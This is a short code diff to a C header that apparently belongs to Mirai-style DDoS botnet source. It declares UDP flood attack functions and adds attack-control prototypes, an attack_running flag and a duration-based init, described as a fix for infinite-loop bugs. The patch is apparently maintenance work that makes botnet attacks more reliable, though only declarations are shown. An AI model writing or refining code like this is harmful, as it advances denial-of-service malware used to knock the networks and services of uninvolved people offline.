@@ -150,6 +150,11 @@ char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
 int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
 uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
 
+/* Attack control - added to fix CRIT-3 (infinite loops) */
+extern volatile sig_atomic_t attack_running;
+BOOL attack_should_continue(void);
+void attack_control_init(uint32_t duration);
+
 /* Actual attacks */
 void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
